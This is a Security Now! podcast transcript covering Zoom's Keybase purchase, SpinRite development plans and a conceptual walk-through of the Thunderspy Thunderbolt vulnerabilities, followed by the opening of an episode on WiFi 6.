"This acquisition marks," he says, "a key step for Zoom as we attempt to accomplish the creation of a truly private video communications platform that can scale to hundreds of millions of participants, while also having the flexibility to support Zoom's wide variety of uses.  Our goal is to provide the most privacy possible for every use case, while also balancing the needs of our users and our commitment to preventing harmful behavior on our platform.  Keybase's experienced team will be a critical part of this mission."



He says:  "Today, audio and video content flowing between Zoom clients, for example, Zoom Rooms, laptop computers, and smartphones running the Zoom app - is encrypted at each sending client device.  It is not decrypted until it reaches the recipients' devices.  With the recent Zoom 5.0 release, Zoom clients now support encrypting content using industry-standard AES-GCM" - we've talked about this previously - with 256-bit keys.  However, the encryption keys for each meeting are generated by Zoom's servers.  Additionally, some features that are widely used by Zoom clients, such as support for attendees to call into a phone bridge or use in-room meeting systems offered by other companies, will always require Zoom to keep some encryption keys in the cloud.  However, for hosts who seek to prioritize privacy over compatibility, we will create a new solution.



"Zoom will offer an end-to-end encrypted meeting mode to all paid accounts."  So that'll be a value-add for payment, for being a paid account.  "Logged-in users will generate public cryptographic identities that are stored in a repository on Zoom's network and can be used to establish trust relationships between meeting attendees."  And of course all of our podcast listeners who have followed along about public key crypto know how that'll work.  That's essentially meaning that Zoom will be a database manager for all logged-in users' public keys.  And that will allow them to synthesize a key that only certain people can get and vice versa.



So he continues, basically establishing trust relationships between meeting attendees.  He says:  "An ephemeral per-meeting symmetric key will be generated by the meeting host.  This key will be distributed between clients, enveloped with the asymmetric key pairs, and rotated when there are significant changes to the list of attendees.  The cryptographic secrets will be under the control of the host, and the host's client software will decide what devices are allowed to receive meeting keys, and thereby join the meeting.  We are also investigating mechanisms that would allow enterprise users to provide additional levels of authentication.



"These end-to-end encrypted meetings will not support phone bridges, cloud recording, or non-Zoom conference room systems.  Zoom Rooms and Zoom Phone participants will be able to attend if explicitly allowed by the host.  Encryption keys will be tightly controlled by the host, who will admit attendees.  We believe this will provide equivalent or better security than existing consumer end-to-end encrypted messaging platforms, but with the video quality and scale that has made Zoom the choice of over 300 million daily meeting participants, including those at some of the world's largest enterprises."  And he goes on, blah blah blah.  But basically that's the gist of it.



So they're essentially creating, using Keybase's reputation, and certainly their technology, I'm sure, that that advisory panel said to Eric, you know, just go buy the practical implementation crypto knowledge that you need because you're in a hurry.  So just go buy it.  And that's what Zoom did.  And I think it was wise.  It gives them headlines.  Clearly they're maintaining this momentum they have of rapidly moving forward to dispel concerns about Zoom's security platform and infrastructure, and actually offering some new features.  The idea, you know, this is clearly focused on a host-centric, a host control of who gets to participate, which makes a lot of sense.  So anyway, again, I've said several times, bravo to Zoom, and that the steps they're taking would make great material for a business management course in business school.  And bravo.



LEO:  Yeah.  I'm going to miss them because I use them for a variety of services, and they're not easily replaced.  But...



STEVE:  That's Keybase, yes.



LEO:  Yeah, Keybase.  But I think Zoom will benefit from it.  Keybase does not use...



STEVE:  Well, it was all open source and GitHub; right? 



LEO:  Not all of it.  Their server side was closed source.  But yeah, there's enough open source stuff that somebody could fork it, and I hope they do.  Keybase did not do - initially did what Eric described.  They would host your PGP or GPG public key in a centralized key database, much like the key servers do, yeah.



STEVE:  Right.



LEO:  But really their most interesting thing was something that they eventually turned to, which is device authentication.  So that you would use an existing Keybase device to add a new Keybase device, and there was a chain of trust going through the devices.  It was very different than the public key/private key crypto system that they used.  I thought that was most interesting.  And I wonder if Zoom will do something like that.  But we'll see.  These guys are very good, I think very talented crypto guys.  So, I mean, they're certainly an asset to Zoom.  And we can find other things to replace Keybase.



STEVE:  And certainly having developed and perfected that interdevice chain of trust, they would be able to offer it to  Eric and say, hey, you know, we've got this stuff.



LEO:  This is a better way of doing it, yeah.



STEVE:  Yeah.



LEO:  Much better way of doing it.  So anyway, we'll see, yeah.



STEVE:  Yeah, very cool.  So since last week my work on SpinRite has been focused on implementing an updated boot prep system because we're going to need it.  We're going to need it soon for the existing testers.  And I'm going to want our podcast listeners to have easy access to the SpinTest, the new technology R&D side, in order to make sure it works on all of their stuff.  So that's going to require that it is easily able to create a bootable thing.  I wrote the current SpinRite version 6, SpinRite 6 Windows boot media prep system 16 years ago, back in 2004.  And I was a little taken aback, because I'm back into the source, when I'm looking at code for compatibility with operation on Windows 95 and 98.



LEO:  Oh, it's been a while, hasn't it, Steve.



STEVE:  Yes, it has.  It's got that.  If you need it, we've got that.  And after all, at the time, Windows 98 was only six years old.  So it was still a going concern.  And at the time the most reliable boot medium was the 1.44MB so-called double-density, because you could have 720K if you didn't have the notch in your disk, the double-density floppy disk.  And of course CDs were in second place.  Back then, not all systems could even boot from USB.  That was an emergent property of BIOSes.  But as all SpinRite users now know, well, know then, I supported all of those modes of creating bootable media.



The largest USB thumb drive capacity numbered in the hundreds of megabytes.  Not gigabytes, megabytes.  So I remember having a 512MB thumb drive, it's like, oh, I'm never going to fill that up.  That was, again, 2004.  So the old-school cylinder head and sector, so-called CHS boot sector, which was able to handle drives of up to 8GB - nobody had a thumb drive of that size - seemed entirely adequate at the time.  Of course, if history is our teacher, we know the rest.  That certainly is the case no longer.  And what's more, if SpinRite is to have a future, and I'm committed to that future, it will need to be able to boot on either older BIOS-based hardware or UEFI systems, without either a classic BIOS or DOS compatibility.



So I'm in the process of building a new boot media prep system that'll give me control over all aspects of the drives it prepares.  For now, that just means that any USB thumb drive it's asked to prepare, regardless of size, will be easily made bootable on any BIOS and DOS system.  And in the future we'll be ready to add UEFI and operation without any DOS OS at all.  And speaking of UEFI, one of the things that has been brought to my attention during this return to work, as I'm headed toward a new release of SpinRite, is the growing importance of UEFI.  Intel no longer supports the traditional BIOS at all, and Apple has dropped the so-called CSM, that's the Compatibility Support Module, from their more recent offerings.



So this all suggests that the BIOS's days are numbered, and that number may not be very big.  As everyone knows, my plan has been to produce a series of 6.x releases to bring SpinRite up to the latest hardware standards.  The idea was for that to buy me time to start over from scratch on the complete reconceptualization of SpinRite as a drive and a file system and a file-aware fully multitasking data maintenance and recovery tool.  So, for example, you could SpinRite everything at once, for example, which is completely doable.  But SpinRite's current user interface has no possibility of that.  And I'm really looking forward to doing that.



But with the BIOS disappearing more quickly than I wish it were, I'm worried that SpinRite's near future users, and even recent Mac purchasers, may again be left without a way to run SpinRite.  So what I'm thinking about is that perhaps SpinRite 7 should happen immediately after SpinRite 6, after the SpinRite 6 series, to address this disappearing BIOS and DOS problem by adding native UEFI booting and the ability to run on the machine without any underlying OS.  DOS, FreeDOS, any DOS is not compatible with UEFI and never apparently will be.  The FreeDOS people have explicitly stated:  We couldn't care less.  We have no intention of supporting UEFI.



Well, okay.  The good news is I don't use DOS for much of anything.  Memory allocation, but that's one of the reasons I just wrote my own memory allocator from scratch for this next round of work.  I'm not using DOS's.  I use it to print to the screen because, well, actually some of the time.  I do a lot of that myself in that whole multitasking user interface.  So it won't be very difficult to say, okay, I don't need DOS at all.  Mostly it just loads the code, and then I tell it to get out of the way.  And I'm obviously going to need that technology, that is, UEFI and no depending upon a nonexistent-in-the-future operating system, for everything that follows anyway.  So doing that first is not a diversion, it just moves things around in sequence to keep a SpinRite that I can create now rather than some time in the future.



And of course we all know I'm not typically very quick with these things.  Look at SQRL.  Yeah, I got it done, but it took longer than I expected.  And that gets us a SpinRite that ought to be able to span the time until SpinRite v8 is ready.  And of course, yeah, I love the name SpinRite v8.  That's sort of appropriate.  So anyway, those are my plans at the moment.  So I'll keep thinking about it, and I'll firm them up as we go.  In the meantime, I'm well at work on SpinRite 6 and hope to have something for our listeners to play with before long.



LEO:  What year will v8 come out?



STEVE:  So the one mistake I always make is I overpromise, and then I get stuck behind the, dare I say the eight-ball.  I'm not going to let that...



LEO:  Yeah.  Are you going to skip 7?



STEVE:  No.  The idea will be I will do 7 immediately in order to give SpinRite UEFI support, which means the ability to run without DOS.  Because SpinRite users are going to need that, even if it's only able to run on one drive at a time.  But, boy, Leo, is it fast.  Oh, my lord.  I saw it run on a drive, that is, the current testing version, 258 megabytes per second, which says, what, a gig every four seconds.  So it suddenly becomes practical again to use SpinRite to maintain drives.  So I'm very...



LEO:  These drives have gotten so big, yeah.



STEVE:  ...very excited about it, yeah.



LEO:  Good.  Well, don't feel the pressure to get to 8 too quickly.  You've got time.



STEVE:  Well, I mean, I'm loving development.  I'm having such a ball being back working on SpinRite again.  And yeah, I mean, I want to enjoy the process and just be working on SpinRite 8.  That's what I'll be doing.  And I'm thinking that I'm going to take a different development approach, which is rather than holding everything back until I have anything, just releasing what I have as I go because it'll be fun to play with, and probably be incrementally useful.  So anyway...



LEO:  Nice.  When's the VR version coming out?  Just teasing.  Just kidding.



STEVE:  Just so you can look around and see your drive in the sky and pull a file out of the air.  Oh, I was looking for this document.  Thank you for recovering it for me.



LEO:  Some day we won't even have files anymore.



STEVE:  Here's my lost dissertation, yes.  Thunderspy.  Okay.  So first, here's the mixed-blessing summary written by Bjrn Ruytenberg - sorry, best I can do - from the Eindhoven University of Technology, describing what his research has uncovered.  He wrote:  "Thunderspy targets devices with a Thunderbolt port."  And as we know, that's a USB Type C port, which is Thunderbolt-enabled, typically.  "If your computer has such a port, an attacker who gets brief physical access to it can read and copy all of your data, even if your drive is encrypted and your computer is locked or set to sleep."  Now, that sounds really bad, until he gets around to the part about the screwdriver, which we'll get to in a second.  But it turns out that's not really necessary, either.



He says:  "Thunderspy is stealth, meaning that you cannot find any traces of the attack.  It does not require your involvement, so there's no phishing link or malicious piece of hardware that the attacker tricks you into using.  Thunderspy works even if you follow best security practices by locking or suspending your computer when leaving briefly, and if your system administrator has set up the device with Secure Boot, strong BIOS and operating system account passwords, and enabled full disk encryption.  All the attacker needs is five minutes alone with the computer, a screwdriver, and some easily portable hardware."  It turns out screwdriver, not so necessary.  But to do the full seven exploits you do need a screwdriver.



He says:  "We have found seven vulnerabilities in Intel's design and developed nine realistic scenarios how these could be exploited by a malicious party to get access to your system, past the defenses that Intel had set up for your protection.  We've developed a free and open source tool, Spycheck, to determine whether your system is vulnerable.  If it is found to be vulnerable, Spycheck will guide you to recommendations on how to help protect your system."



And I got so involved in his paper that I forgot to put a link.  I think it's, oh, it's Thunderspy.io.  So that's easy to find:  https://thunderspy.io.  And there you'll find a description, and he's got Windows and a Linux version of his tool and some other stuff.  Okay.  So to get a quick sense for what this means, what he's talking about - oh, and I should also mention, you know, this has been described as an "Evil Maid" attack, meaning that the physical presence thing is what we're now calling the Evil Maid.  And I would argue that it's not really an Evil Maid unless your Maid was trained at MIT.



LEO:  That's an excellent point.  That's an evil spy.  Evil, yeah, yeah.



STEVE:  Yeah.  So to get a quick sense for what this all means, the next step is to look at what he wrote in the abstract for his formal security research paper.  It was 23 pages, I think, long.  And I'm not going to drag everyone through it.  It's not necessary because we want to get the gist of this.  But it provides, the abstract provides some necessary and interesting background on Thunderbolt and what that implies.  So he explains:  "Thunderbolt is a proprietary I/O protocol promoted by Intel and included in a number of laptops, desktops, and other systems.  As an external" - and here's the key.  "As an external interconnect, it allows exposing the system's internal PCI Express (PCIe) domain to external devices."  This is where we insert "What could possibly go wrong?"



He says:  "This enables high-bandwidth, low-latency use cases, such as external graphics cards.  Being PCIe-based, Thunderbolt devices possess Direct Memory Access-enabled I/O, allowing complete access to the state of a PC and the ability to read and write all of system memory.  In recent years, the former characteristic - the ability to read and write all of system memory - has prompted research into attacks collectively known as 'Evil Maid,' which require an attacker-controlled device and only seconds of physical access to the computer.



"Industry response has been twofold.  First, hardware and OS vendors incorporated support for DMA remapping using I/O Memory Management Units (IOMMUs), which imposes memory protections on DMA.  However, following various implementation issues, OS vendors classified DMA remapping as an optional countermeasure requiring driver support.  Second, revised Thunderbolt controllers introduced a software-based access control measure enabling users to authorize trusted devices only."  And I heard you mentioning on MacBreak Weekly, Leo, the notion of a whitelist.  Unfortunately, we'll see that doesn't actually provide much protection, in fact.



He says:  "As a result, unidentified devices should be barred from system access without prior user interaction."  Sounds great, although we're not supposed to call it "whitelist" anymore, I realize.  I've forgotten what it's going to be.



LEO:  Allow list.  An allow list, yes.



STEVE:  An allow list.  Okay.



LEO:  Shocking.



STEVE:  "In the context," he's saying, "of Thunderbolt, studies have primarily focused on employing DMA and IOMMU attacks on the PCIe level.  We therefore investigate the feasibility of breaking Thunderbolt protocol security by analyzing the protocol and its software and hardware stack, as well as associated PCIe-based technology.  In our study, we have found and experimentally confirmed multiple vulnerabilities that break all primary Thunderbolt 3 security claims.  Based on our ongoing research, in this report we disclose the following vulnerabilities."  Seven of them.  "Inadequate firmware verification schemes, weak device authentication scheme, use of unauthenticated device metadata, backwards compatibility with legacy protocol versions, use of unauthenticated controller configurations, SPI flash interface deficiencies, and no Thunderbolt security on Boot Camp.



"Finally," he says, "we present nine practical exploitation scenarios.  Given an Evil Maid threat model and varying security levels, we demonstrate the ability to create arbitrary Thunderbolt device identities; clone user-authorized Thunderbolt devices; and, finally, obtain PCIe connectivity to perform DMA attacks.  In addition, we show unauthenticated overriding of security level configurations, including the ability to disable Thunderbolt security entirely, and restoring Thunderbolt connectivity if the system is restricted to exclusively passing through USB and/or DisplayPort."  That is, if Thunderbolt protocol has been disabled on the USB port, he can get it back.  "We conclude this report by demonstrating the ability to permanently disable Thunderbolt security and block all future firmware updates."  In other words, once in, they can stay in.



So of course we've used the very useful term "security perimeter" many times before.  It's a conceptually clean way of establishing the idea of what's under protection, where the barrier to penetration is, what sort of protection is available and needed, and where the resulting vulnerabilities lie.  So if nothing else, it seems very clear that this was necessary research, even if its theoretical exploitability seems low.



And frankly, as we'll see, it's actually not very low.  But it is not remote in any way.  It does require local access.  It seems very clear that this was necessary research.  Even if it's theoretical at this point, just look at how the purely and equally theoretical, actually way more theoretical, this is actually exploitable, Spectre and Meltdown vulnerabilities hugely deepened our understanding of the exploitability of the many once-believed-to-be-safe CPU performance optimizations that all of our chips had at the time.



So this research, the nature, this kind of research is super useful stuff.  And there appears to be a real desire to export a system's internal bus through an easy-to-use serial connector.  This dates back to the original 1394 Firewire, where exploits of its exported hardware bus similarly afflicted that interface.  So here again it appears that, just as with Firewire, security was layered on later, almost as an afterthought.  I mean, remember they were talking about adding DMA protection.  What do you mean, adding?  How could you not have it, like from the beginning?  Oh, yeah, we're going to put the PCIe bus, your internal system bus, on a connector on the side of your laptop or on the back of your PC.  How does that sound?  Think of all the things you can connect to it.  Yes.  And bad guys.



So as we observed a decade ago on this podcast, if the bad guys have access to the hardware, hardware of any kind - 10 years ago we were talking about a DVD player which must fundamentally be able to decrypt the disks, which are encrypted, in order to play them.  If the bad guys can get to the DVD player, they can get the decryption keys.  And similarly, no matter what you do, you cannot protect things locally.  But you sure can make it easier to exploit, which is what a pluggable PCIe bus does.



So here in our present situation, if you have an MIT-trained Evil Maid with unfettered access to a system whose hardware is exporting its internal bus to the outside world, then yeah, once again all bets are off.  The research paper, as I mentioned before, is 23 pages of detailed "here's how I did it" information.  But a summary of the seven vulnerabilities is not overly long, and it'll give us a better sense for Thunderbolt's measures and countermeasures.  So I've got seven - this is an explosion of those seven points.



First, inadequate firmware verification schemes.  "Thunderbolt host and device controllers operate using updatable firmware stored in its SPI flash."  That's Serial Programming Interface, SPI, which is the way all those little itty-bitty eight-pin chips on motherboards now operate is serially.  Everything's gone serial because we can do that now speedy.  And it just completely reduced our pin count.  So we don't need parallel buses, we just have serial buses.  So it's been a big win.



So "Thunderbolt host and device controllers operate using updatable firmware stored in its SPI flash.  Using this feature, Thunderbolt hardware vendors occasionally provide firmware updates online to address product issues after release. To ensure firmware authenticity, upon writing the image to the  flash, Thunderbolt controllers verify the firmware's embedded signature against Intel's public key stored in silicon."  Sounds great; right?



"However, we have found authenticity is not verified at boot time, upon connecting the device, or ever again, at any later point.  During our experiments, using a SPI programmer, we have written arbitrary unsigned firmware directly onto the SPI flash.  Subsequently, we've been able to verify Thunderbolt controller operation using our modified firmware."  So in other words, the sanctioned way of writing the Thunderbolt controller firmware verifies the firmware's signature, but only at the time of that writing.  So anything that bypasses the sanctioned means of updating the firmware can make any changes it wishes.  And the then-broken firmware will henceforth be rerun without ever being reverified.



And since the firmware is the thing that updates itself, you can disable the firmware updating, make it look like it worked, but never actually update the firmware.  So that would require intimate knowledge of the system's motherboard, whether it's desktop or laptop.  You would need to attach a little SPI programmer clip to the back to the SPI chip or to the controller's SPI programming pins, if it exports those.  I mean, we know it does because it needs to be reprogrammed.  And that's where you need somebody really trained up for this particular problem.



But the point is that the firmware is only verified once it's written through the official channel and never subsequently.  So as, Leo, you were saying on MacBreak Weekly, and I completely agree, this is the kind of thing that has the NSA and the CIA just salivating because, if they didn't already know this, they know it now.  And this is their scale of attack.  But there are way easier ways to get up to some mischief.



Number two, weak device authentication:  "As noted above, device identification" - and this is before these points were laid out.  They talked about how it's just some short strings of metadata, basically.  So they say:  "As noted above, device authentication  comprises several strings and numerical identifiers.  However, we have found none of the identifiers are linked to the Thunderbolt controller or one another, cryptographically or otherwise."



In other words, this means that impersonation of any previously authenticated device is trivial.  You briefly connect an identity capture device to anything that was previously permitted to connect, like a display or a graphics card or whatever Thunderbolt thing that's been whitelisted.  You read and capture the device's stated identity and simply impersonate that device to obtain full and unfettered access yourself.  And there's, again, no authentication beyond just an unencrypted, unauthenticated string.



Number three, which is sort of a repetition of two, use of unauthenticated device metadata.  He says:  "Thunderbolt controllers store device metadata in a firmware section referred to as Device ROM (DROM).  We have found that DROM is not cryptographically verified.  Following from the first issue, this vulnerability enables constructing forged Thunderbolt device identities.  In addition, when combined with the second issue" - which is lack of authentication of stated identities - "forged identities may partially or fully comprise arbitrary data."  So in other words, even if a previously authorized device is not available for identity cloning, it's possible to simply plant a malicious device's identity metadata into the system's Device ROM to give it then full access permission.



Point four, and this is always a bugaboo, backwards compatibility:  "Thunderbolt 3 host controllers support Thunderbolt 2 device connectivity, irrespective of Security Levels."  Which is a concept introduced in Thunderbolt 3.  Well, since Thunderbolt 2 devices didn't know about that, if you plug in a Thunderbolt 2 device, well, we'll just not have any Security Levels.



"This backwards compatibility," they write, "subjects Thunderbolt 3-equipped systems to the vulnerabilities introduced by Thunderbolt 2 hardware."  And I didn't do any digging to determine what those vulnerabilities in Thunderbolt 2 were, but presumably there were some.  And as a consequence of the need for backward compatibility, they are subject to returning when you plug a Thunderbolt 2 device into your brand new spiffy Thunderbolt 3 system.



Problem five, the use of unauthenticated controller configurations.  He writes:  "In UEFI, users may choose to employ a Security Level" - that's capital "S," capital "L," that's a formally defined thing, there are four levels - "different from the default level.  In storing Security Level state, we've determined that Thunderbolt employs two state machines, with one instance being present in UEFI, and another residing in host controller firmware.



"However, we have found firmware configuration authenticity is not verified at boot time, upon resuming from sleep, or at any later point.  In addition, we've found these state machines may be subjected to desynchronization, with controller firmware overriding UEFI state without being reflected in the latter.  As such, this vulnerability subjects the Thunderbolt host controller to unauthenticated, covert overriding of Security Level configuration."  So again, it's clear that the security of the system could have been made much tighter, but it wasn't.



Six, SPI flash interface deficiencies:  "Thunderbolt systems rely on SPI flash to store controller firmware" - the first vulnerability - "and maintain their Security Level state" - the fifth vulnerability.  "In our study, we have found Thunderbolt controllers lack handling hardware error conditions when interacting with flash devices.  Specifically, we've determined that enabling flash write protection first prevents changing the Security Level configuration in UEFI, again without being reflected in the latter; and, two, prevents controller firmware from being updated, without such failures being reflected in Thunderbolt firmware update applications.  As such, when combined with the fifth issue, this vulnerability allows for the cover and permanent disabling of Thunderbolt security and will also silently block all future firmware updates."



And seventh, last but not least, no Thunderbolt security on Boot Camp.  Meaning none.  So all of these other problems are still affecting Apple devices that offer Thunderbolt ports.  But on top of that, any security attempts that are there are relinquished:  "Apple supports running Windows on Mac systems using the Boot Camp utility.  Aside from Windows, this utility may also be used to install Linux.  When running either operating system, Mac UEFI disables all Thunderbolt security by employing the Security Level 'None.'  This vulnerability subjects the Mac system to trivial Thunderbolt-based DMA attacks."  When running either operating system.  So that also assumes that you could use Boot Camp to get to there, and that would set Thunderbolt security to none.



LEO:  I don't think that's the case.



STEVE:  And then make it subject to attack.  So you probably don't actually even need to boot those OSes.  Again, I didn't dig into this deeply.



LEO:  Yeah.



STEVE:  So where does that leave us?  The complete lack of hardware-level enforcement of per-boot firmware verification means that our current hardware systems cannot, our current hardware systems, the stuff we all have now, cannot be made invulnerable to the "Evil MIT Grad" attack.  Since the SPI chip holding the Thunderbolt firmware is on the system's motherboard, and since SPI programmers are a dime a dozen - literally, they're almost free on Amazon or eBay - if someone with sufficient knowledge were to gain access to a machine, they could override any protections.



So again, this is a heyday for any situation where it's possible to open up a device, have sufficient knowledge and planning ahead of time, knowing the make and model and so forth, you could figure out ahead of time where the SPI chip is and be ready to just clip it on, quickly reprogram it, unclip it, close the machine back up, and you now have future external access to the internal state of that machine through its Thunderbolt port.



But the more worrisome attack, to my mind, since it's something that any old untrained Evil Maid could do, even a naive maid, when an authorized external Thunderbolt device is available, it's simple to unplug that device, plug it into a Thunderbolt device ID cloning tool, grab its identity, then turn around and impersonate that device and obtain full access to the system's internal PCIe bus.  It's just there.  It's built in.  So while it would be nice to think that this could be fixed in the future, the fact that device identity metadata is not currently authenticated means that impersonation is trivial.



And even if some future Thunderbolt 4 were to fix this, as it seems likely to try to because, after all, all of our Intel chips are running more slowly now because of Spectre and Meltdown, even though no one actually created an attack that worked, presumably there will be a response to this detailed takedown of Thunderbolt.  If you are going to maintain backward compatibility to our current unauthenticated devices, I don't see how you ever bypass the impersonation attack.  So backward compatibility bites us, unfortunately.



So our ultimate takeaway is that, by just about any definition of security, exporting a system's internal bus is almost always a really bad idea.  And that's the case here once again.  Very cool to have, but you really do need to plug it with epoxy if you don't ever want anybody to actually be able to plug into it.



LEO:  Right.



STEVE:  Or electrically disconnect it.  I guess maybe that'll be what happens is that there'll be a physical - well, on the other hand, if the bad guys get inside, they can just reconnect it.  And you would think, oh, I'm safe, my port's disconnected, when in fact it wouldn't be.  So wow.



LEO:  Well, there you have it, ladies and gentlemen.



STEVE:  Do not export your PCI bus.



LEO:  But Apple does seem to have a way to keep it secure.  I wonder what they're doing to keep it secure.  In order to - insecure, you have to be running Windows or Linux under Boot Camp.  That doesn't say that if you're running...



STEVE:  No, no.  No, that's just this Security Level thing.



LEO:  That setting is persistent after you exit?



STEVE:  No, it's a Security Level, and vulnerability six bypasses that.



LEO:  But only when you're running Linux in Windows.



STEVE:  No, no.  It's complicated.  So there's this notion of four levels of security.  And if you're using Boot Camp, then the Mac sets it to none.



LEO:  Right.



STEVE:  But if you weren't, then you use the previous one through six vulnerabilities, which all Macs also have.



LEO:  So I get it.  I guess.  Apple says they're not insecure.  So I'll have to look more into this.  Apple says they're not vulnerable to these other ones.  But maybe I'm misunderstanding.



STEVE:  They have to be, well, I mean, I should look into it, too, because the device ID cloning is trivial, and there's no way they're not vulnerable to that.  So, I mean, technically it's not their fault.  I don't mean to be blaming Apple.



LEO:  No, it's Thunderbolt, I understand, yeah, yeah.



STEVE:  Yeah, it's absolutely Intel's boneheaded idea of, like, wow, wouldn't it be cool to export the PCI...



LEO:  Intel's kernel protection technologies do not bypass one through four, do not protect you against one through four?



STEVE:  Right.  So that's the protection that just appeared in 2019.



LEO:  Right. 



STEVE:  And that's still not protection from this.



LEO:  Okay.  Well, there we have it.  Steve's going to be back on Thursday, a rare appearance on a Thursday by Steve Gibson.  We're doing an event with LastPass, 1:00 p.m. Pacific, 4:00 p.m. Eastern.  This is much like the event we did in Boston.  Big difference is we're streaming it because of COVID.  So everybody's able to attend, which is great.



STEVE:  And Leo, I don't know, are we going to do a virtual selfie line?  What are we going to do at events like this?



LEO:  They'll just have to pose in front of the TV screen and take a picture.



STEVE:  I'm not going to be able to sign anybody's copies of SpinRite.



LEO:  No, no, no.  But you will be able to watch.  It's going to be a panel on the future of identity, which is a really interesting topic.



STEVE:  Yes.



LEO:  Steve Gibson; Gerry Beuchelt, who's the CISO of LogMeIn;  Andrew Keen, who is really great on the political implications of all of this.  It's going to be a fascinating panel.  1:00 o'clock it starts, Pacific time, 4:00 p.m. on Thursday.  You can watch live at TWiT.tv/live or listen live.  And it will then after the fact be put up on the TWiT events feed.  And we're going to - I should tell people we're going to give you a chance to ask questions using Twitter.  So we'll have a hashtag.  I don't think we know what it is yet.  But we'll have a hashtag which you can then ask questions on Twitter as you listen to the presentation, and we'll address those in the last half hour of the panel.  So see you Thursday, 1:00 p.m. Pacific, 4:00 p.m. Eastern time.  Thank you, Steve.



STEVE:  Thanks, buddy.



LEO:  If you want to get Security Now!, the easiest thing to do is to go to Steve's site, GRC.com, 16Kb versions, 64Kb versions, even carefully crafted transcriptions of the show exist there, along with SpinRite and ShieldsUP! and all sorts of great stuff.  GRC.com.  He's on Twitter, @SGgrc.  You can DM him there.  He allows DMs from everybody.  So that's a good place to ask questions.  Or GRC.com/feedback.



We have copies of the show at our website, TWiT.tv/sn.  Best thing to do, subscribe.  That way you'll get it the minute it's available, every Tuesday.  We do the show 1:30 p.m. Pacific, 4:30 Eastern, 20:30 UTC on Tuesdays at TWiT.tv/live.



Thanks, Steve.  And stay safe, stay healthy.  We'll be back here Thursday and then again next Tuesday for Security Now!.



STEVE:  Perfect.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#767

DATE:		May 19, 2020

TITLE:		WiFi 6

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-767.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  We begin this week as we often do on the third Tuesday with a look at the previous week's Patch Tuesday; and, in this case, a troubling new trend is emerging.  We look at the DoH support coming soon to Windows 10, and at a little known packet capture utility that was quietly added to Windows 10 with the October 2018 feature update.  We'll spend a bit of time on yesterday's DOJ/FBI press conference, and then take a look at a problem that Microsoft appears to be having a surprising time resolving.  We'll take a look at face masks thwarting automated public facial recognition, and Utah's decision to roll their own contact tracing and locating app.  And we'll wind up with what I hope will be an interesting walk through the history of Ethernet, from the beginning of wired to the evolution of the many confusing wireless protocols.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We'll look at last week's Patch Tuesday.  Believe it or not, the third highest number of vulnerabilities last Tuesday, only topped by March and April.  What's going on with Windows?  Steve will talk about it.  And then a deep dive into the technology of WiFi 6 and why it might be worth waiting for WiFi 6E.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 767, recorded Tuesday, May 19th, 2020:  WiFi 6.



It's time for Security Now! with Steve Gibson.  He's over there.  Now he's there.  He's there.  Actually...



STEVE GIBSON:  I'm over here, Leo.



LEO:  What people don't know is, they see you there, but I see you there, there, there, there, there, there.  I have seven or eight Steves around me at all times, many screens.



STEVE:  That's more than you need.



LEO:  Plenty of Steve.  Hi, Steve, good to see you.



STEVE:  Good to be back.



LEO:  Episode 767.



STEVE:  Yup.



LEO:  Flying into the future.



STEVE:  Yup.  And we are, as we will see, a few days, I think three days, shy of a major anniversary.



LEO:  Oh.



STEVE:  The 47th anniversary of the invention of Ethernet.



LEO:  Oh, Bob Metcalfe.



STEVE:  Yes.  I want to talk about WiFi 6, not for any particular reason except that there was no, like, outstanding news of the week.  And I just sort of thought, okay, I've had it on my list of things to kind of get to because this whole 802.11a/b/g/n/ac, all of this is - oh, my god.  Yeah, it's just a mess.  And so I thought, let's sort of take a walk through history, looking at where this started, and look at the major milestones as we've gone along to look at the evolution of this, wrapping up with, well, some interesting recommendation.  Because just last month the FCC approved another chunk, actually it's a 1200 MHz bandwidth chunk up at the 6 GHz band, separate from 2.4 and 5, which is what WiFi now uses, which the industry's going to immediately jump on because it represents "next."



And so the question is, if you were about to go to 6, what are the things to consider about that?  And maybe it makes sense to wait till you get a base station, an access point that is able to take advantage of the next stuff.  So anyway, we're going to finish with that.



But we've got, as we often do on the third Tuesday of every month, take a look at the previous week's Patch Tuesday and, in this case, maybe a worrying new trend which is emerging.  We'll also take a look at the DoH support coming soon to a Windows 10 near you.  That is, natively, in the OS itself.  So not just the browser, but everything.  Also, a little-known packet capture utility that was quietly slipped into Windows 10 back with the October 2018 feature update, which I will talk about how you can use it to verify what type of DNS your Windows 10 system is using after you configure it to use DoH, see if it actually is.



We're going to spend a bit of time on yesterday's DOJ/FBI press conference, where they're moaning more about Apple, and also take a look at a problem that Microsoft appears to be having a surprising time resolving.  And as I was researching this, I kind of got this, well, I wouldn't put it as, I don't know, it wasn't a sinking feeling.  But it's like, okay, this doesn't seem to be Microsoft up to their usual game.  Also we've got - I got a kick out of this - face masks are thwarting automated public facial recognition in the U.K.



LEO:  Good.



STEVE:  Oh, boohoo, uh-huh.  And Utah's decision to roll their own contact tracing and locating app.  We're going to take a look at it.  And why I end up thinking, you know, if it were available in California, I think I would probably step up and do it, yeah.



LEO:  Oh, really?  Good, good.



STEVE:  And then we'll wind up talking about - I have a little brief update on SpinRite, of course, because I'm working on that full-time now.  And then we're going to start from Bob Metcalfe on.



LEO:  Wow.  From Bob - you're going to skip Token Ring, I hope.



STEVE:  Yes.  We're not doing Token Ring.



LEO:  Actually, relevant to that Utah story, any minute now, maybe not today, but I think it'll be today, we'll get the next generation of iOS that will include that new API for that kind of contact tracing.  So that should be kind of interesting.



STEVE:  Oh, and Leo, I forgot to mention we have the Painful Pun Picture of the Week for our listeners.



LEO:  I'm looking at it right now.



STEVE:  Actually for our viewers.  But anyway, our listeners will get it, too.  So this was photoshopped, but it was pretty clever.  



LEO:  See if people get the pun.  See if they get the pun.



STEVE:  It shows a guy wearing a white mask.  And of course on the front of it - well, not "of course," but in this particular  mask the front of it has stenciled "255.255.255.0."  So of course that makes it a subnet mask.



LEO:  Oh.



STEVE:  Oh.



LEO:  And a very restrictive one, I might add.



